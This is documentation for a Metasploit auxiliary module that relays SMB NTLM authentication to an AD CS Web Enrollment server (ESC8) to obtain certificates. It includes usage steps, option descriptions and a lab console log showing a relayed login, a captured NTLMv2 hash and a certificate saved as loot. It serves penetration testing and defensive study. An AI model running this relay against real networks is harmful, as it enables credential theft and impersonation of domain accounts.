## Vulnerable Application
This module creates an SMB server and then relays the credentials passed to it
to an HTTP server to gain an authenticated connection.  Once that connection is
established, the module makes an authenticated request for a certificate based
on a given template.

## Verification Steps

1. Install and configure the application
    * See https://docs.metasploit.com/docs/pentesting/active-directory/ad-certificates/overview.html#setting-up-a-esc8-vulnerable-host
2. Start `msfconsole`
2. Do: `use auxiliary/server/relay/esc8`
3. Set the `RANDOMIZE_TARGETS` option to the AD CS Web Enrollment server
4. Run the module and wait for a request to be relayed

## Options

### MODE
The issue mode. This controls what the module will do once an authenticated session is established to the Web Enrollment
server. Must be one of the following options:

* ALL: Enumerate all available certificate templates and then issue each of them
* AUTO: Automatically select either the `User` or `Machine` template to issue based on if the authenticated user is a
  user or machine account. The determination is based on checking for a `$` at the end of the name, which means that it
  is a machine account.
* QUERY_ONLY: Enumerate all available certificate templates but do not issue any
* SPECIFIC_TEMPLATE: Issue the certificate template specified in the `CERT_TEMPLATE` option

### CERT_TEMPLATE
The template to issue if MODE is SPECIFIC_TEMPLATE.

## Scenarios

### Version and OS

```
msf6 auxiliary(server/relay/esc8) > run
[*] Auxiliary module running as background job 1.
msf6 auxiliary(server/relay/esc8) > 
[*] SMB Server is running. Listening on 0.0.0.0:445
[*] Server started.
[*] New request from 192.168.159.129
[*] Received request for MSFLAB\smcintyre
[*] Relaying to next target http://192.168.159.10:80/certsrv/
[+] Identity: MSFLAB\smcintyre - Successfully authenticated against relay target http://192.168.159.10:80/certsrv/
[SMB] NTLMv2-SSP Client     : 192.168.159.10
[SMB] NTLMv2-SSP Username   : MSFLAB\smcintyre
[SMB] NTLMv2-SSP Hash       : smcintyre::MSFLAB:821ad4c6b40475f4:07a6e0fd89d9af86a5b0e12d24915b4d:010100000000000071fe99aa0a27db01eabcbc6e8fcb6ed20000000002000c004d00530046004c00410042000100040044004300040018006d00730066006c00610062002e006c006f00630061006c0003001e00440043002e006d00730066006c00610062002e006c006f00630061006c00050018006d00730066006c00610062002e006c006f00630061006c000700080071fe99aa0a27db01060004000200000008003000300000000000000001000000002000004206ecc9e398d7766166f0f45d8bdcf7708c8f278f2cff1cc58017f9acf0f5400a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100350039002e003100320038000000000000000000

[*] Creating certificate request for MSFLAB\smcintyre using the User template
[*] Generating CSR...
[*] CSR Generated
[*] Requesting relay target generate certificate...
[+] Certificate generated using template User and MSFLAB\smcintyre
[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=184&
[+] Certificate for MSFLAB\smcintyre using template User saved to /home/smcintyre/.msf4/loot/20241025142116_default_192.168.159.10_windows.ad.cs_995918.pfx
[*] Relay tasks complete; waiting for next login attempt.
[*] Received request for MSFLAB\smcintyre
[*] Identity: MSFLAB\smcintyre - All targets relayed to
[*] New request from 192.168.159.129
[*] Received request for MSFLAB\smcintyre
[*] Identity: MSFLAB\smcintyre - All targets relayed to
```
